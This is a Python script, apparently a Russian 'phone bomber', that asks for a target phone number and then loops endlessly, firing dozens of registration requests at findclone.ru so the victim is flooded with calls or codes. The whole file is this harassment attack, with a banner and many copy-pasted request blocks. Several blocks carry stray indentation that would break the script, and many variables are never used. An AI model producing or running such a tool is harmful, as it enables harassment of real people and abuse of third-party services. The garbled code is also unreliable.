import requests, random, datetime, sys, time, argparse, os
os.system("clear")
banner = """\033[32m
   ▄▄█▀▀▀▀▀█▄▄
 ▄█▀         ▀█▄
 █              █
 █              █\033[37m  Anonimst\033[33m
 █    ▀██▄ ██▀ █\033[37m  Vk: @termux_lab\033[33m
 █      ▀    ▀  █\033[37m  github.com/Anonimst\033[32m
 ▀█▄   ▀▀▀   ▄█▀
  ▄█   ▄▄▄▄█▀▀
  █  ▄█▀
  ▀▀▀▀
"""
print(banner + '\033[0m')
_phone = input('79xxxxxxxxx: ')

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]


iteration = 0
print('\033[0m ')
print(' ')
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
			try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		iteration += 1
		print(('{}  Волна пройдена.').format(iteration))
	except:
		break
